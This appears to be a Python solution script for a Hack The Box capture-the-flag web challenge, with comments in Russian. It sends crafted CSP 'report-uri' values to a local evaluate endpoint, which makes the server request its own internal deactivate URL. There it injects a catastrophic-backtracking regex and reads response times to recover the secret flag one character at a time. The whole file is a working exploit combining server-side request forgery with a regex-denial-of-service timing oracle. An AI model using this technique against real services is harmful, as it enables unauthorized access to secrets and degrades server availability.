import requests
import urllib.parse

evaluate_uri = 'http://localhost:1337/api/evaluate'
deactivate_uri = 'http://127.1:1337/deactivate?secretCode='

possible_symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789[]{}/\\!@#$%^&*()_+=-<>?'
chars_to_escape = '[]{}/\\!@#$%^&*()_+=-<>?'
regex = '.*|(?=.{2})((.*)*)*salt'
start_flag = 'HTB{'
end_flag = '}'
current_value = ''
result = start_flag

#Пока текущий символ не равен концу флага
while current_value != end_flag:
    for current_symbol in possible_symbols:
        normalized_symbol = current_symbol

        #Экранирование символа если он содержится в chars_to_escape
        if chars_to_escape.__contains__(current_symbol):
            normalized_symbol = '\\' + current_symbol

        #Составление регулярного выражения вида "известное начало флага + текущий символ + сложное выражение"
        full_regex = result + normalized_symbol + regex

        #Кодирование и добавление регулярного выражения к uri
        uri = deactivate_uri + urllib.parse.quote(full_regex)

        data = {
            'csp': 'report-uri ' + uri + ';'
        }

        headers = {
            'Content-Type': 'application/json'
        }

        response = requests.post(evaluate_uri, json=data, headers=headers)
        request_execution_time = response.elapsed.total_seconds()

        #Если время выполнения запроса больше 1.5 секунд, переходим к следующему символу
        if request_execution_time > 1.5:
            continue

        result += current_symbol
        current_value = current_symbol
        print(result)
        break
